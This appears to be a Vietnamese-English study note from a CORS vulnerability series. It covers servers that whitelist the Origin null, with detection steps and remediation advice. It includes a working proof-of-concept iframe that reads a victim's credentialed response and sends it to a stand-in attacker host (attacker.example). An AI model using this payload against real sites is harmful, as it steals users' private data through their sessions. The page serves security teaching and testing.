# CORS Vulnerability: Trusted Null Origin

## What Is `Origin: null`

Theo specification, `Origin` có thể là `null` trong một số tình huống:

- Request từ `file:` protocol.
- Request từ serialized data/document.
- Sandboxed iframe.
- Một số chuỗi redirect cross-origin.

## Vulnerability Pattern

Server whitelists `null` và (thường) cho phép credentials:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

## Why It Is Dangerous

Attacker có thể tạo context browser sinh `Origin: null` bằng iframe sandbox, từ đó vượt qua whitelist.

## PoC Pattern

```html
<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="
<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
    location = 'https://attacker.example/log?d=' + encodeURIComponent(this.responseText);
  };
  req.open('GET', 'https://vulnerable-website.com/sensitive-victim-data', true);
  req.withCredentials = true;
  req.send();
</script>"
></iframe>
```

## Exploitation Conditions

| Condition                              | Meaning                                 |
| -------------------------------------- | --------------------------------------- |
| `Origin: null` được trust              | Browser attacker context được chấp nhận |
| `ACAC: true` + client send credentials | Session nạn nhân được dùng              |
| Endpoint có dữ liệu nhạy cảm           | Có giá trị exfiltration                 |

## Detection Steps

1. Replay request với `Origin: null`.
2. Kiểm tra `ACAO: null` có được trả về không.
3. Kiểm tra có `ACAC: true` không.
4. Run browser PoC bằng sandboxed iframe để xác nhận đọc response.

## Remediation

- Không whitelist `null` cho production API chứa dữ liệu nhạy cảm.
- Tách endpoint local-development khỏi endpoint production.
- Dùng explicit allowlist origin và validate exact.

## Related Files

- [Whitelist and Parser Bypasses](07-whitelist-and-parser-bypasses.md)
- [Exploitation Workflows](11-exploitation-workflows.md)
